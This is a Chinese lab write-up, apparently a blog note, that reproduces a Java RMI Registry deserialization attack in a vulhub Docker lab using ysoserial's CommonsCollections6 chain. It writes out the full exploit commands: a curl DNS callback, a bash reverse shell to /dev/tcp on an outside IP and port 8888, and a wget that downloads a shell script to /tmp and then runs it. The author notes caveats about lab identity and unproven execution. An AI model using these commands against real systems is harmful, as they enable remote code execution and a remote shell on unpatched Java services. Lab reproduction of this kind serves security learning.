ailx10说：这篇是2023年10月之前写的，后来又改过。这次轮到 Java RMI，我先想办法让 Registry 处理构造的对象，再看依赖链能不能走到命令。最初用 DNS 记录找线索，直接连接没有成功，就拆成下载脚本和执行脚本两步继续试。笔记里有成功，也有没走通的地方，对我来说比只留一张结果图更有用。这里面版本、库依赖、远程调用是否开放都很重要；最后连接是什么身份，也只是靶场进程的运行身份，不能顺手写成我又完成了一次提权。

---

原实验在旧 JDK RMI Registry 中观察了 DNS 回调，之后尝试文件下载和进程启动。依赖远程 bind、可用依赖及版本条件。截图中的 root 是靶场进程身份，不代表完成提权。

前提：准备好docker环境，下载好vulhub，进入目录 ，开始复现漏洞

- `docker-compose build`
- `docker compose run -e RMIIP=144.34.162.13 -p 1099:1099 rmi`

完成试验后，记得删除漏洞环境哦～～

实验结束后可在确认项目目录和 Compose 配置后关闭该项目的服务；原文的全局 Docker 清理命令已移除。

环境启动后，RMI Registry监听在1099端口。

![](/notes-assets/0082d2bc66e7c993a3c1.webp)

先访问dnslog，点击get subdomain

```
uurrw1.dnslog.cn
```

![](/notes-assets/c17e4ea288e0ec828709.webp)

然后在另一台机子上，运行这条命令，注意需要提前下载好ysoserial-all.jar[\[2\]](#ref_2)

```
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 144.34.162.13 1099 CommonsCollections6 "curl uurrw1.dnslog.cn"
```

![](/notes-assets/8ef9c4a65d15ddf073c1.webp)

原文记录 DNS 查询；单独的 DNS 回调不能证明所有后续命令执行均成功。

![](/notes-assets/87c2de7fb8f238721a41.webp)

再来试试反弹shell，测试发现直接bash反弹无效，但是发现可以下载文件，于是来一个曲径通幽，准备好sh文件

```
/bin/bash -i >& /dev/tcp/174.137.58.6/8888 0>&1
```

准备好web服务

![](/notes-assets/694a57e9303e6a66b42f.webp)

准备好接收反弹shell

![](/notes-assets/595313cb5f0ae1549180.webp)

准备下载sh文件

```
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 144.34.162.13 1099 CommonsCollections6 "wget http://174.137.58.6:7777/ailx10.sh -O /tmp/shell"
```

![](/notes-assets/4ab7af96a457c2d20fe6.webp)

准备执行sh文件

```
java -cp ysoserial-all.jar ysoserial.exploit.RMIRegistryExploit 144.34.162.13 1099 CommonsCollections6 "bash /tmp/shell"
```

![](/notes-assets/4ab7af96a457c2d20fe6.webp)
